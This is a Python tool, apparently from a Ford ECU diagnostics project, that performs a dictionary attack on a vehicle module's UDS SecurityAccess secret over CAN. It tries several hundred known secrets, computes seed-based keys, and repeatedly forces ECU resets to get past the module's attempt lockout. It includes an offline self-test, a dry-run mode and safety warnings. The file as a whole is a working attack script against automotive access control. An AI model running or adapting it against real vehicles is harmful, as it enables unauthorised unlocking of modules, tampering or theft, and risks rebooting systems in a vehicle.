#!/usr/bin/env python3
"""Dictionary attack on a Ford module's SecurityAccess secret.

WHAT THIS IS
------------
A port of FoCCCus `c346::bruteSecretKey()` onto this project's proven ISO-TP
stack (vbf.Ecu) and universal keygen (ford_seckey). For each candidate secret
in ford_keybag it runs one live seed/key exchange:

    10 <session>                 once, re-sent after every forced ECUReset
    27 <level>        -> 67 <level> <seed3>
    27 <level+1> <key(seed,secret)>
                      -> 67  == the secret is CORRECT
                      -> 7F 27 35 invalidKey  == wrong, try the next candidate
                      -> 7F 27 36 exceedNumberOfAttempts -> 11 01 reset, resume
                      -> 7F 27 37 requiredTimeDelayNotExpired -> wait, resume

It is a DICTIONARY attack, not a brute force: 2^40 is unreachable, these are
the few hundred secrets seen in the wild. A miss proves only that the secret is
not in the dictionary.

WHY IT IS SAFE(ish)
-------------------
The tool sends session requests (0x10), SecurityAccess probes (0x27), and
bounded ECU resets (0x11); no erase, download, or DID write is sent. Nothing
is persisted in flash. An ECUReset visibly reboots the instrument cluster
(gauges sweep, odometer reappears). The reset count is bounded by --max-resets.

    DO NOT run this on a moving vehicle. The cluster will reboot repeatedly.

KEY DEDUPLICATION
-----------------
Different secrets can map to the same key (the keygen's 2^16 equivalence
class), and that grouping is seed-independent. Candidates are therefore grouped
by the key they produce and each group costs ONE live attempt; a hit reports
every secret in the group, since they are indistinguishable by any seed.

USAGE
    ./ford_brutekey.py IPC --iface can1 --level 1 --yes
    ./ford_brutekey.py IPC --iface can1 --level 1 --dry-run   # plan only
    ./ford_brutekey.py --self-test                            # offline proof
"""
import argparse
import os
import sys
import time
from typing import Any

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

import ecu_db                                                  # noqa: E402
import ford_keybag                                             # noqa: E402
import ford_seckey                                             # noqa: E402
from vbf import NRC, Ecu, fmt, iface_is_up                     # noqa: E402


# Sessions that grant each SecurityAccess level on Ford modules, from the UCDS
# captures in this workspace: the flash path unlocks level 1 from
# programmingSession (10 02 -> 27 01), while the writeDataByIdentifier path
# unlocks level 3 from extendedSession (10 03 -> 27 03).
DEFAULT_SESSION = {1: 0x02, 3: 0x03}


def nrc_of(r):
    """Return the NRC byte of a negative response, else None."""
    if r is not None and len(r) >= 3 and r[0] == 0x7F:
        return r[2]
    return None


def nrc_name(code):
    return NRC.get(code, f"NRC 0x{code:02X}")


def group_by_key(secrets, seed):
    """Group candidate secrets by the key they produce for `seed`.

    Returns [(key_bytes, [secret, ...]), ...] in first-seen secret order. The
    grouping is a property of the keygen, not of the seed, so computing it once
    per run is valid for every later seed.
    """
    order, groups = [], {}
    for sec in secrets:
        k = ford_seckey.key_from_seed(seed, sec)
        if k not in groups:
            groups[k] = []
            order.append(k)
        groups[k].append(sec)
    return [(k, groups[k]) for k in order]


class SessionError(RuntimeError):
    """The module stopped cooperating; the search cannot continue."""


class BruteForcer:
    """One dictionary run against one module.

    Pure protocol logic over an `Ecu`-shaped object, so --self-test can drive
    it with a fake module whose secret is known.
    """

    def __init__(self, ecu, level, session, *, delay=0.0, max_resets=400,
                 reset_settle=1.5, timeout=3.0, verbose=True, clock: Any = time):
        if level % 2 == 0:
            raise ValueError(f"security level must be odd (request level), "
                             f"got {level}")
        self.ecu = ecu
        self.level = level
        self.session = session
        self.delay = delay
        self.max_resets = max_resets
        self.reset_settle = reset_settle
        self.timeout = timeout
        self.verbose = verbose
        self.clock = clock
        self.attempts = 0
        self.resets = 0
        self.seeds_seen = set()

    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    # -- protocol primitives -------------------------------------------------
    def open_session(self):
        r = self.ecu.req("10%02X" % self.session, timeout=self.timeout,
                         what="10 %02X diagnosticSession" % self.session)
        if r is None:
            raise SessionError(f"10 {self.session:02X}: no response "
                               f"(module silent)")
        if r[0] != 0x50:
            raise SessionError(f"10 {self.session:02X} refused: {fmt(r)}")
        return r

    def reset_and_resume(self, why):
        """11 01 ECUReset to clear the attempt counter, then re-open the session.

        This is the only state-changing request the tool makes, and the only
        way past exceedNumberOfAttempts without waiting out the ECU's delay.
        """
        if self.resets >= self.max_resets:
            raise SessionError(
                f"{why} and the reset budget is spent ({self.resets} of "
                f"{self.max_resets}). Raise --max-resets to continue.")
        self.resets += 1
        self.log(f"   {why} -> 11 01 ECUReset "
                 f"({self.resets}/{self.max_resets}), module reboots")
        self.ecu.req("1101", timeout=self.timeout, what="11 01 ECUReset")
        self.clock.sleep(self.reset_settle)
        # A just-rebooted module drops the first frames; poke it before 10 xx.
        self.ecu.wake(tries=8, timeout=0.5, what="post-reset wake")
        self.open_session()

    def request_seed(self):
        """Return seed bytes, or raise SessionError. Handles lockout NRCs."""
        silent = 0
        for _ in range(6):
            r = self.ecu.req("27%02X" % self.level, timeout=self.timeout,
                             what="27 %02X requestSeed" % self.level)
            code = nrc_of(r)
            if r is None:
                # A Ford module entering programmingSession jumps into its
                # bootloader and goes briefly silent, so the FIRST 27 01 after
                # 10 02 can time out while the PBL is still coming up
                # (observed on the IPC: 50 02 answered, next 27 01 silent,
                # the same request succeeds moments later). Re-open the session
                # and retry a bounded number of times before declaring the
                # module dead.
                silent += 1
                if silent > 2:
                    raise SessionError(
                        f"27 {self.level:02X}: no response after {silent} "
                        f"attempts (module silent)")
                self.log(f"   requestSeed silent ({silent}/2), re-opening "
                         f"session 0x{self.session:02X}")
                self.clock.sleep(0.5)
                self.ecu.wake(tries=4, timeout=0.5, what="seed retry wake")
                self.open_session()
                continue
            if code in (0x36, 0x37):
                self.reset_and_resume(f"requestSeed {nrc_name(code)}")
                continue
            if code in (0x7E, 0x11, 0x12, 0x7F):
                raise SessionError(
                    f"27 {self.level:02X} rejected as {nrc_name(code)}: this "
                    f"module does not offer level {self.level} in session "
                    f"0x{self.session:02X}. Try --level/--session.")
            if code is not None:
                raise SessionError(f"27 {self.level:02X}: {fmt(r)}")
            if len(r) < 5 or r[:2] != bytes((0x67, self.level)):
                raise SessionError(f"27 {self.level:02X}: unexpected {fmt(r)}")
            seed = bytes(r[2:5])
            if seed == b"\x00\x00\x00":
                # Ford reports an all-zero seed when the level is ALREADY
                # unlocked. Every key would then be accepted, so any "hit"
                # would be meaningless -- refuse rather than report a lie.
                raise SessionError(
                    "seed is 00 00 00: level is already unlocked, so every "
                    "key would be accepted. Power-cycle the module and rerun.")
            self.seeds_seen.add(seed)
            return seed
        raise SessionError("requestSeed kept returning a lockout NRC")

    def try_key(self, key):
        """True on unlock, False only on invalidKey, None after lockout reset."""
        self.attempts += 1
        r = self.ecu.req("27%02X%s" % (self.level + 1, key.hex()),
                         timeout=self.timeout,
                         what="27 %02X sendKey" % (self.level + 1))
        code = nrc_of(r)
        if r is None:
            raise SessionError(f"27 {self.level + 1:02X}: no response")
        if code is None and len(r) >= 2 and r[:2] == bytes((0x67, self.level + 1)):
            return True
        if code == 0x35:              # invalidKey: the expected miss
            return False
        if code in (0x36, 0x37):
            self.reset_and_resume(f"sendKey {nrc_name(code)}")
            return None  # this candidate was NOT evaluated; retry with a new seed
        # Only invalidKey (NRC 35) proves the candidate was actually tested.
        # A broken session/sequence must abort, never become a dictionary miss.
        raise SessionError(f"27 {self.level + 1:02X}: unexpected "
                           f"{fmt(r)}; key was not evaluated")

    # -- the search ---------------------------------------------------------
    def run(self, secrets):
        """Try every candidate. Returns the matching group or None."""
        groups = group_by_key(secrets, b"\x11\x22\x33")
        total = len(groups)
        self.log(f"   {len(secrets)} candidate secrets collapse to {total} "
                 f"distinct keys ({len(secrets) - total} redundant)")
        self.ecu.wake(tries=8, timeout=0.5, what="wake")
        self.open_session()
        t0 = self.clock.time()
        for i, (_, group) in enumerate(groups, 1):
            shown = "/".join(s.hex().upper() for s in group)
            while True:
                seed = self.request_seed()
                key = ford_seckey.key_from_seed(seed, group[0])
                self.log(f"   [{i}/{total}] secret {shown}  seed "
                         f"{seed.hex().upper()} -> key {key.hex().upper()}")
                result = self.try_key(key)
                if result is not None:
                    break
            if result:
                dt = self.clock.time() - t0
                self.log(f"\n   *** UNLOCKED on attempt {self.attempts} "
                         f"after {dt:.1f}s ***")
                return group
            if self.delay:
                self.clock.sleep(self.delay)
        return None

    def verify(self, secret):
        """Re-unlock from a fresh session to prove the hit is reproducible.

        A single 0x67 can also come from a module that was already unlocked or
        that accepts any key in some state; a second independent session with a
        DIFFERENT seed is what turns a hit into a result.
        """
        self.reset_and_resume("verification")
        while True:
            seed = self.request_seed()
            key = ford_seckey.key_from_seed(seed, secret)
            self.log(f"   verify: seed {seed.hex().upper()} -> key "
                     f"{key.hex().upper()}")
            result = self.try_key(key)
            if result is not None:
                return result, seed


# --------------------------------------------------------------------------
# offline self-test: a fake module with a known secret proves the loop
# --------------------------------------------------------------------------
class FakeEcu:
    """Minimal UDS module for offline verification of the search loop.

    Models the behaviour that actually breaks naive implementations: a session
    is required, the seed changes every request, only `secret` is accepted, and
    the module locks out after `max_attempts` wrong keys until an ECUReset.
    """

    def __init__(self, secret, level=1, session=0x02, max_attempts=2,
                 zero_seed=False):
        self.secret = bytes.fromhex(secret) if isinstance(secret, str) else secret
        self.level = level
        self.session = session
        self.max_attempts = max_attempts
        self.zero_seed = zero_seed
        self.in_session = False
        self.unlocked = False
        self.wrong = 0
        self.seed = None
        self.resets = 0
        self.counter = 0
        self.log = []

    def wake(self, **kw):
        return b"\x7e\x00"

    def req(self, hexstr, **kw):
        self.log.append(hexstr)
        b = bytes.fromhex(hexstr)
        sid = b[0]
        if sid == 0x10:
            self.in_session = b[1] == self.session
            return bytes([0x50, b[1], 0x00, 0x32, 0x01, 0xF4]) \
                if self.in_session else b"\x7f\x10\x12"
        if sid == 0x11:
            self.resets += 1
            self.in_session = False
            self.unlocked = False
            self.wrong = 0
            return b"\x51\x01"
        if sid == 0x27:
            sub = b[1]
            if not self.in_session:
                return b"\x7f\x27\x7e"
            if sub == self.level:
                if self.wrong >= self.max_attempts:
                    return b"\x7f\x27\x36"
                if self.unlocked or self.zero_seed:
                    return bytes([0x67, sub, 0, 0, 0])
                self.counter += 1
                self.seed = (self.counter * 0x9E3779 & 0xFFFFFF).to_bytes(3, "big")
                return bytes([0x67, sub]) + self.seed
            if sub == self.level + 1:
                if self.wrong >= self.max_attempts:
                    return b"\x7f\x27\x36"
                if self.seed is None:
                    return b"\x7f\x27\x24"
                want = ford_seckey.key_from_seed(self.seed, self.secret)
                self.seed = None
                if bytes(b[2:5]) == want:
                    self.unlocked = True
                    return bytes([0x67, sub])
                self.wrong += 1
                return b"\x7f\x27\x35"
        return b"\x7f" + bytes([sid, 0x11])


class _NoSleepClock:
    def sleep(self, _):
        pass

    def time(self):
        return 0.0


def self_test(verbose=True):
    ok = True

    def chk(name, cond, detail=""):
        nonlocal ok
        ok = ok and bool(cond)
        if verbose:
            print(f"  {'PASS' if cond else 'FAIL'}  {name}"
                  + (f"  {detail}" if detail else ""))

    # Anchor on the published keygen vector directly. ford_seckey.selftest()
    # also cross-checks the BCM repo, which may not be present; its absence
    # must not look like a broken keygen here.
    chk("keygen published vector 1F7C69 / 0000FA5FC0 -> 9A64CE",
        ford_seckey.key_from_seed(bytes.fromhex("1F7C69"),
                                  0x0000FA5FC0).hex() == "9a64ce")
    cands = ford_keybag.candidates()
    chk("keybag loads 381 unique candidates", len(cands) == 381, str(len(cands)))
    chk("FoCCCus-only mode drops the extension tier",
        len(ford_keybag.candidates(ext=False)) == 343,
        str(len(ford_keybag.candidates(ext=False))))
    chk("extension tier adds nothing already in KEYBAG",
        not (set(ford_keybag.KEYBAG_EXT) & set(ford_keybag.KEYBAG)))
    chk("every candidate is 5 bytes", all(len(c) == 5 for c in cands))

    # The grouping must be seed-independent, or one attempt per group is wrong.
    g1 = group_by_key(cands, b"\x11\x22\x33")
    g2 = group_by_key(cands, b"\xde\xad\xbe")
    part = lambda g: sorted(tuple(sorted(s.hex() for s in v)) for _, v in g)
    chk("key-grouping is seed-independent", part(g1) == part(g2))
    chk("grouping covers every candidate",
        sum(len(v) for _, v in g1) == len(cands))

    # A secret in the middle of the dictionary must be found, and the reported
    # group must contain it.
    target = cands[200]
    fake = FakeEcu(target, level=1, session=0x02)
    bf = BruteForcer(fake, 1, 0x02, verbose=False, clock=_NoSleepClock())
    hit = bf.run(cands)
    chk("finds a secret from the dictionary",
        hit is not None and target in hit, target.hex().upper())
    chk("spends one live attempt per distinct key",
        bf.attempts == 201, f"attempts={bf.attempts}")
    chk("worked through the module's attempt lockout", fake.resets > 0,
        f"resets={fake.resets}")
    chk("saw a different seed on each request", len(bf.seeds_seen) > 100,
        f"{len(bf.seeds_seen)} distinct seeds")

    # The hit must survive an independent session with a fresh seed.
    good, vseed = bf.verify(hit[0])
    chk("hit verifies in a second session", good)
    chk("verification used a seed not used by the hit", vseed is not None)

    # A secret OUTSIDE the dictionary must not produce a false positive.
    fake2 = FakeEcu("A1B2C3D4E5", level=1, session=0x02)
    bf2 = BruteForcer(fake2, 1, 0x02, verbose=False, clock=_NoSleepClock(),
                      max_resets=10_000)
    chk("reports no hit for a secret outside the dictionary",
        bf2.run(cands) is None)

    # An already-unlocked module would accept anything: refuse, don't lie.
    fake3 = FakeEcu(cands[0], level=1, session=0x02, zero_seed=True)
    bf3 = BruteForcer(fake3, 1, 0x02, verbose=False, clock=_NoSleepClock())
    try:
        bf3.run(cands)
        refused = False
    except SessionError as e:
        refused = "already unlocked" in str(e)
    chk("refuses to search an already-unlocked module", refused)

    # A module that does not offer the level must say so, not grind 343 keys.
    fake4 = FakeEcu(cands[0], level=3, session=0x03)
    bf4 = BruteForcer(fake4, 1, 0x03, verbose=False, clock=_NoSleepClock())
    try:
        bf4.run(cands)
        named = False
    except SessionError as e:
        named = "does not offer level" in str(e)
    chk("names an unsupported security level", named)

    # A module that goes briefly silent after 10 02 (its PBL coming up) must be
    # retried, not declared dead -- observed live on the IPC.
    class _SilentOnceEcu(FakeEcu):
        def __init__(self, *a, **kw):
            super().__init__(*a, **kw)
            self.silenced = False

        def req(self, hexstr, **kw):
            if hexstr.startswith("27") and not self.silenced:
                self.silenced = True
                self.log.append(hexstr + " (silent)")
                return None
            return super().req(hexstr, **kw)

    fake5 = _SilentOnceEcu(cands[0], level=1, session=0x02)
    bf5 = BruteForcer(fake5, 1, 0x02, verbose=False, clock=_NoSleepClock())
    hit5 = bf5.run(cands)
    chk("survives a one-off silent requestSeed after 10 02",
        hit5 is not None and cands[0] in hit5)

    # ...but a permanently silent module must still fail, and fail fast.
    class _AlwaysSilentEcu(FakeEcu):
        def req(self, hexstr, **kw):
            if hexstr.startswith("27"):
                return None
            return super().req(hexstr, **kw)

    bf6 = BruteForcer(_AlwaysSilentEcu(cands[0], level=1, session=0x02), 1,
                      0x02, verbose=False, clock=_NoSleepClock())
    try:
        bf6.run(cands)
        fast = False
    except SessionError as e:
        fast = "module silent" in str(e)
    chk("a permanently silent module fails fast", fast)

    class _BrokenSequenceEcu(FakeEcu):
        def req(self, hexstr, **kw):
            if hexstr.startswith("2702"):
                return b"\x7f\x27\x24"
            return super().req(hexstr, **kw)

    badseq = BruteForcer(_BrokenSequenceEcu(cands[0]), 1, 0x02,
                         verbose=False, clock=_NoSleepClock())
    try:
        badseq.run([cands[0]])
        refused_sequence = False
    except SessionError as e:
        refused_sequence = "27 02" in str(e)
    chk("requestSequenceError aborts, not a false dictionary miss",
        refused_sequence)

    class _StalePositiveEcu(FakeEcu):
        def req(self, hexstr, **kw):
            if hexstr.startswith("2702"):
                return b"\x67\x03"   # positive SID, WRONG subfunction
            return super().req(hexstr, **kw)

    stale = BruteForcer(_StalePositiveEcu(cands[0]), 1, 0x02,
                        verbose=False, clock=_NoSleepClock())
    try:
        stale.run([cands[0]])
        refused_stale = False
    except SessionError:
        refused_stale = True
    chk("wrong SecurityAccess subfunction cannot be a hit", refused_stale)

    class _StaleSeedEcu(FakeEcu):
        def req(self, hexstr, **kw):
            if hexstr == "2701":
                return b"\x67\x03\x12\x34\x56"  # seed for another level
            return super().req(hexstr, **kw)

    badseed = BruteForcer(_StaleSeedEcu(cands[0]), 1, 0x02,
                          verbose=False, clock=_NoSleepClock())
    try:
        badseed.run([cands[0]])
        refused_seed = False
    except SessionError:
        refused_seed = True
    chk("wrong SecurityAccess seed subfunction aborts before sendKey",
        refused_seed and badseed.attempts == 0)

    class _SendLockoutEcu(FakeEcu):
        def __init__(self, *a, **kw):
            super().__init__(*a, **kw)
            self.first_key = True

        def req(self, hexstr, **kw):
            if hexstr.startswith("2702") and self.first_key:
                self.first_key = False
                return b"\x7f\x27\x36"
            return super().req(hexstr, **kw)

    locked = _SendLockoutEcu(cands[0])
    bf_locked = BruteForcer(locked, 1, 0x02,
                           verbose=False, clock=_NoSleepClock())
    locked_hit = bf_locked.run([cands[0]])
    chk("sendKey lockout retries the SAME candidate with a fresh seed",
        locked_hit is not None and cands[0] in locked_hit
        and bf_locked.attempts == 2 and locked.resets == 1)
    locked.first_key = True
    verified_after_lockout, _ = bf_locked.verify(cands[0])
    chk("verification retries after sendKey lockout",
        verified_after_lockout is True and locked.resets == 3)

    # Known-good anchor: the IPC level-3 secret solved from the UCDS captures
    # must reproduce one of those captured pairs through this module's keygen.
    chk("IPC DM5T level-3 secret reproduces capture 36CB31 -> A6D25E",
        ford_seckey.key_from_seed(bytes.fromhex("36CB31"),
                                  bytes.fromhex("000024E4DE")).hex() == "a6d25e")
    print("\nSELF-TEST:", "OK" if ok else "FAILURES")
    return ok


# --------------------------------------------------------------------------
def build_parser():
    p = argparse.ArgumentParser(
        description="Dictionary attack on a Ford module's SecurityAccess "
                    "secret, using the FoCCCus keybag.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s IPC --iface can1 --level 1 --yes\n"
               "  %(prog)s IPC --iface can1 --level 1 --dry-run\n"
               "  %(prog)s --self-test\n")
    p.add_argument("ecu", nargs="?", help="ECU name or CAN id (e.g. IPC, 720)")
    p.add_argument("--iface", default=None,
                   help="SocketCAN interface (default: the ECU's bus)")
    p.add_argument("--rxid", type=lambda x: int(x, 0), default=None,
                   help="override response CAN ID (default: profile's)")
    p.add_argument("--level", type=lambda x: int(x, 0), default=1,
                   help="SecurityAccess request level, odd (default 1)")
    p.add_argument("--session", type=lambda x: int(x, 0), default=None,
                   help="diagnostic session to open first (default: 0x02 for "
                        "level 1, 0x03 for level 3)")
    p.add_argument("--timeout", type=float, default=3.0,
                   help="per-request timeout, seconds (default 3)")
    p.add_argument("--delay", type=float, default=0.0,
                   help="extra pause between candidates, seconds")
    p.add_argument("--max-resets", type=int, default=400,
                   help="cap on 11 01 ECUResets used to clear the attempt "
                        "counter (default 400). Ford modules typically allow "
                        "only 2-3 wrong keys per power cycle, so a full "
                        "343-candidate run needs well over 100 resets — a low "
                        "cap stops the search, it does not protect the module.")
    p.add_argument("--reset-settle", type=float, default=1.5,
                   help="seconds to wait after an ECUReset (default 1.5)")
    p.add_argument("--start", type=int, default=0,
                   help="skip the first N candidates (resume a run)")
    p.add_argument("--limit", type=int, default=None,
                   help="try at most N candidates")
    p.add_argument("--extra", action="append", default=[],
                   help="additional candidate secret, 10 hex digits "
                        "(repeatable; tried after the dictionary)")
    p.add_argument("--only", action="append", default=[],
                   help="try ONLY these secrets instead of the dictionary "
                        "(repeatable)")
    p.add_argument("--from-file", default=None,
                   help="read candidate secrets (10 hex digits per line, "
                        "'#' comments allowed) from this file INSTEAD of the "
                        "dictionary — e.g. every 5-byte window of a RAM/flash "
                        "dump, which is how a secret held in the bootloader "
                        "can be found without an exhaustive search")
    p.add_argument("--no-ext", action="store_true",
                   help="use only the FoCCCus dictionary, skipping the "
                        "secrets harvested from other public tools")
    p.add_argument("--no-registered-first", action="store_true",
                   help="do not try the secrets ecu_db already registers for "
                        "this ECU before the dictionary")
    p.add_argument("--logfile", default=None,
                   help="append the raw request/response trace to this file")
    p.add_argument("--dry-run", "-n", action="store_true",
                   help="print the plan and candidate count; open no socket")
    p.add_argument("--yes", "-y", action="store_true",
                   help="skip the confirmation prompt")
    p.add_argument("--self-test", action="store_true",
                   help="run the offline verification suite and exit")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.self_test:
        return 0 if self_test() else 1
    if not args.ecu:
        raise SystemExit("name the target ECU (e.g. IPC), or use --self-test")

    profile = ecu_db.resolve(args.ecu)
    if profile is None:
        known = ", ".join(sorted({p.name.split()[0]
                                  for p in ecu_db.ECUS.values()}))
        raise SystemExit(f"unknown ECU {args.ecu!r}. Known: {known}")
    if args.level % 2 == 0:
        raise SystemExit(f"--level must be the odd REQUEST level (1, 3, 5...), "
                         f"got {args.level}")
    session = args.session if args.session is not None \
        else DEFAULT_SESSION.get(args.level, 0x03)
    iface = args.iface or profile.default_iface()
    rxid = args.rxid if args.rxid is not None else profile.resp_id()

    if args.only:
        # --only must NOT fall through to the dictionary.
        candidates = [bytes.fromhex(s.replace(" ", "")) for s in args.only]
        for c in candidates:
            if len(c) != 5:
                raise SystemExit(f"--only {c.hex()}: secret must be 5 bytes")
        source = f"--only ({len(candidates)} given)"
    elif args.from_file:
        raw, seen = [], set()
        with open(args.from_file) as fh:
            for n, line in enumerate(fh, 1):
                line = line.split("#")[0].strip().replace(" ", "")
                if not line:
                    continue
                if len(line) != 10:
                    raise SystemExit(f"{args.from_file}:{n}: {line!r} is not "
                                     "10 hex digits")
                b = bytes.fromhex(line)
                if b not in seen:
                    seen.add(b)
                    raw.append(b)
        candidates = raw
        source = f"{args.from_file} ({len(candidates)} unique)"
    else:
        first = ()
        if not args.no_registered_first:
            # If a secret ecu_db already knows works, there is nothing to
            # search for -- try those first and finish in one attempt.
            first = tuple(dict.fromkeys(
                r.secret for r in profile.secrets
                if r.level in (args.level, None)))
        candidates = ford_keybag.candidates(first=first, extra=args.extra,
                                            ext=not args.no_ext)
        source = (f"ford_keybag ({len(ford_keybag.KEYBAG)} FoCCCus"
                  + ("" if args.no_ext
                     else f" + {len(ford_keybag.KEYBAG_EXT)} other tools")
                  + ")"
                  + (f" + {len(first)} registered for this ECU" if first else "")
                  + (f" + {len(args.extra)} --extra" if args.extra else ""))
    candidates = candidates[args.start:]
    if args.limit is not None:
        candidates = candidates[:args.limit]
    if not candidates:
        raise SystemExit("no candidates left to try (check --start/--limit)")

    print("=" * 72)
    print(f"BRUTEKEY  {profile.name}  tx=0x{profile.txid:03X} rx=0x{rxid:03X}  "
          f"bus={profile.bus} iface={iface}")
    print("=" * 72)
    print(f"   candidates   {len(candidates)}  from {source}")
    print(f"   level        27 {args.level:02X} requestSeed / "
          f"27 {args.level + 1:02X} sendKey")
    print(f"   session      10 {session:02X} "
          + ("programmingSession" if session == 0x02 else
             "extendedSession" if session == 0x03 else ""))
    print(f"   sends ONLY   10 {session:02X}, 27 {args.level:02X}/"
          f"{args.level + 1:02X}, 3E 00, and 11 01 ECUReset when locked out")
    print("   NOT sent     no erase, no download, no DID write — nothing is "
          "written to the module")
    print(f"   !! {profile.name} will REBOOT on each lockout reset "
          f"(up to {args.max_resets}). Vehicle must be stationary.")

    if args.dry_run:
        groups = group_by_key(candidates, b"\x11\x22\x33")
        print(f"\n   {len(candidates)} secrets -> {len(groups)} distinct keys "
              f"= {len(groups)} live attempts")
        print("   first 5 keys for seed 112233: "
              + ", ".join(k.hex().upper() for k, _ in groups[:5]))
        print("\n*** DRY RUN — connected to nothing, nothing was sent. ***")
        return 0

    up = iface_is_up(iface)
    if up is False:
        raise SystemExit(f"interface {iface} is DOWN. "
                         f"sudo ip link set {iface} up")
    if up is None and not os.path.exists(f"/sys/class/net/{iface}"):
        raise SystemExit(f"interface {iface} does not exist.")

    if not args.yes:
        ans = input(f"Try {len(candidates)} secrets against {profile.name} "
                    f"on {iface}? [y/N] ").strip().lower()
        if ans != "y":
            print("aborted by user.")
            return 0

    logf = None
    if args.logfile:
        os.makedirs(os.path.dirname(args.logfile) or ".", exist_ok=True)
        logf = open(args.logfile, "a")
        logf.write(f"\n==== {time.strftime('%F %T')} brutekey {profile.name} "
                   f"level {args.level} ====\n")
    ecu = Ecu(iface, profile.txid, rxid, execute=True, logfile=logf)
    bf = BruteForcer(ecu, args.level, session, delay=args.delay,
                     max_resets=args.max_resets,
                     reset_settle=args.reset_settle, timeout=args.timeout)
    rc = 1
    try:
        print()
        hit = bf.run(candidates)
        if hit is None:
            print(f"\n   no candidate unlocked level {args.level} after "
                  f"{bf.attempts} attempts ({bf.resets} resets).")
            print("   The secret is NOT in this dictionary. That is not proof "
                  "it does not exist —\n   solve it from a UCDS capture "
                  "instead (one seed/key pair plus the linear solver).")
        else:
            print("\n   verifying in an independent session...")
            good, _ = bf.verify(hit[0])
            names = ", ".join(s.hex().upper() for s in hit)
            if good:
                print(f"\n*** SECRET FOUND: {names} ***")
                if len(hit) > 1:
                    print("    (these are keygen-equivalent: identical keys "
                          "for every seed)")
                print(f"    Register it in ecu_db.py:  "
                      f"SecretRule(\"<F111 prefix>\", {args.level}, "
                      f"\"{hit[0].hex().upper()}\")")
                rc = 0
            else:
                print(f"\n!! {names} unlocked once but FAILED to reproduce in "
                      "a second session.\n   Treat it as unproven — rerun "
                      f"with --only {hit[0].hex().upper()}")
    except SessionError as e:
        print(f"\n!! stopped: {e}")
        print(f"   {bf.attempts} attempts, {bf.resets} resets.")
    except KeyboardInterrupt:
        print(f"\n!! interrupted after {bf.attempts} attempts "
              f"({bf.resets} resets).")
        print(f"   Resume roughly where you stopped with --start {bf.attempts}")
    finally:
        try:
            ecu.req("1101", timeout=2.0, what="11 01 ECUReset (cleanup)")
        except Exception:                                      # noqa: BLE001
            pass
        if logf:
            logf.close()
    return rc


if __name__ == "__main__":
    sys.exit(main())
